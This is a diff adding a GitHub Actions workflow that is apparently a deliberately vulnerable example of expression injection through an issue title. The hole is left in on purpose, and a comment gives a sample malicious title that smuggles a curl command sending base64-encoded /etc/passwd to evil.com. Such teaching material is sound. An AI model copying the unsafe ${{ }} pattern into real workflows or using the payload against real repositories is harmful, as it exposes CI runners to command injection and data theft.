@@ -1,0 +1,22 @@
+name: "VULN-01: Expression Injection via Issue Title"
+
+# VULNERABILITY: Unsafe use of ${{ }} expression in run: context
+# RISK: Attacker-controlled issue title is injected directly into shell command
+# DEFENSE: Use environment variable intermediary instead of direct expression
+
+on:
+  issues:
+    types: [opened, edited]
+  workflow_dispatch:
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Greet the issue author
+        # ⚠️ VULNERABLE: Direct expression injection in shell context
+        # An attacker can create an issue with title: test"; curl http://evil.com/$(cat /etc/passwd | base64) #
+        run: |
+          echo "New issue opened: ${{ github.event.issue.title }}"
+          echo "By: ${{ github.event.issue.user.login }}"
+          echo "Processing issue..."
